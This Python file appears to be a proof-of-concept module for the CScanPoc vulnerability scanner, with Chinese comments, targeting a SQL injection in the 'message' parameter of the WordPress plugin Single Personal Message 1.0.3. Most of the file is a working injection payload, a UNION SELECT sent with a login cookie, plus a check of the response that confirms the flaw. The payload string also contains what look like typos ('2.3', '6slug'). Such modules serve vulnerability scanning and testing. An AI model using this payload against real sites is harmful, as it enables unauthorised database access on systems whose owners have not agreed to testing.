# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType


class Vuln(ABVuln):
    vuln_id = 'WordPress_0100_L' # 平台漏洞编号
    name = 'Wordpress插件Single Personal Message SQL注入' # 漏洞名称
    level = VulnLevel.HIGH # 漏洞危害级别
    type = VulnType.INJECTION # 漏洞类型
    disclosure_date = '2016-12-09'  # 漏洞公布时间
    desc = '''
    WordPress是一个基于PHP和MySQL的免费开源内容管理系统（CMS）。功能包括插件架构和模板系统。它与博客最相关，但支持其他类型的网络内容，包括更传统的邮件列表和论坛，媒体画廊和在线商店。截至2018年4月，超过6000万个网站使用，包括前1000万个网站的30.6％，WordPress是最受欢迎的网站管理系统正在使用中。WordPress也被用于其他应用领域，如普适显示系统（PDS）。
    Wordpress插件Single Personal Message的admin.php页面的message参数存在SQL注入漏洞。由于程序未能充分过滤用户提交的输入，攻击者可以通过该漏洞控制应用程序，访问或修改数据，或利用底层数据库中潜在的漏洞。
    ''' # 漏洞描述
    ref = 'http://www.cnvd.org.cn/flaw/show/CNVD-2016-12076' #
    cnvd_id = 'CNVD-2016-12076' # cnvd漏洞编号
    cve_id = 'CVE-2017-1002026'  # cve编号
    product = 'WordPress'  # 漏洞组件名称
    product_version = 'WordPress Single Personal Message 1.0.3'  # 漏洞应用版本

class Poc(ABPoc):
    poc_id = 'c99ef374-efee-425f-8962-1b58269f8537' # 平台 POC 编号
    author = '国光'  # POC编写者
    create_date = '2018-08-01' # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                },
                'cookie': {
                    'type': 'string',
                    'description': '登录cookie',
                    'default': '',
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip('/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            arg = '{target}'.format(target=self.target)
            payload = "/wp-admin/admin.php?page=simple-personal-message-outbox&action=view&message=0%20UNION%20SELECT%201,2.3,md5(233),5,6slug,7,8,9,10,11,12%20FROM%20wp_terms%20WHERE%20term_id=1"
            
            vul_url = arg + payload
            headers = {
                'Content-Type':'application/x-www-form-urlencoded',
                'Cookie':self.get_option('cookie')
            }
            response = requests.get(vul_url,headers=headers)
            self.output.info("正在执行SQL注入测试语句")
            if response.status_code ==200 and 'e165421110ba03099a1c0393373c5b43' in response.text:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(target=self.target, name=self.vuln.name))
        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()

if __name__ == '__main__':
    Poc().run()